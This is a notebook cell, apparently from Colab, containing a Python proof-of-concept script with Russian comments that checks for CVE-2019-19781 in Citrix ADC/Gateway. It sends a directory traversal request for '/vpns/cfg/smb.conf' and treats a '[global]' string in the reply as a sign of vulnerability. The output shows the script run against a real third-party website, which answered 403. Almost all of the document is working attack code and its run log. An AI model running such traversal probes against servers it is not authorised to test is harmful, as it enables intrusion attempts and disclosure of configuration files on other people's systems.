In [6]:
import sys
from typing import NoReturn

import requests

def build_test_url(base_url: str) -> str:
    """
    Собирает URL для проверки уязвимости.

    :param base_url: базовый URL сервера, например https://example.com
    :return: полный URL с попыткой обхода директорий
    """
    base = base_url.rstrip("/")
    # Классический тестовый путь для CVE-2019-19781
    path = "/vpn/../vpns/cfg/smb.conf"
    return base + path


def check_cve_2019_19781(target_url: str) -> bool:
    """
    Отправляет GET-запрос на сформированный URL и
    возвращает True, если ответ похож на уязвимый.

    Признак уязвимости:
    - код ответа 200
    - в теле есть строка "[global]" (типично для smb.conf)
    """
    print(f"[+] Отправляем запрос к {target_url!r}")

    try:
        response = requests.get(
            target_url,
            timeout=10,
            headers={
                "User-Agent": "CVE-2019-19781 PoC (educational script)" # Changed to ASCII-only
            },
        )
    except requests.RequestException as error:
        print(f"[-] Не удалось выполнить запрос: {error}")
        return False

    print(f"[+] Код ответа сервера: {response.status_code}")

    if response.status_code != 200:
        return False

    body_snippet = response.text[:500]

    if "[global]" in body_snippet:
        # Типичная секция конфигурации smb.conf
        print("[+] Найдена сигнатура '[global]' в ответе сервера.")
        return True

    return False


def main() -> NoReturn:
    """
    Точка входа скрипта.
    Запрашивает у пользователя базовый URL и выполняет проверку.
    """
    base_url = ""
    # For Colab execution, rely on input() or a default,
    # as sys.argv can be unpredictable when running cells directly.
    try:
        base_url = input(
            "Введите базовый URL сервера "
            "(например, https://example.com): "
        ).strip()
    except EOFError:
        # Handle cases where input() might not be interactive (e.g., in some automated environments)
        print("[-] Интерактивный ввод недоступен. Использую URL по умолчанию для теста.")
        base_url = "https://example.com" # Default test URL

    if not base_url:
        print("[-] Базовый URL не задан. Завершение.")
        raise SystemExit(1)

    test_url = build_test_url(base_url)
    is_vulnerable = check_cve_2019_19781(test_url)

    print("\n=== Результат проверки ===")
    if is_vulnerable:
        print(
            "[!] Потенциально уязвимый Citrix ADC / Gateway.\n"
            "    ВАЖНО: результат требует дополнительной "
            "ручной проверки и сопоставления с версией ПО."
        )
    else:
        print(
            "[+] Признаков CVE-2019-19781 не обнаружено "
            "по данному тесту."
        )


if __name__ == "__main__":
    main()

Введите базовый URL сервера (например, https://example.com): https://elements.envato.com/
[+] Отправляем запрос к 'https://elements.envato.com/vpn/../vpns/cfg/smb.conf'
[+] Код ответа сервера: 403

=== Результат проверки ===
[+] Признаков CVE-2019-19781 не обнаружено по данному тесту.
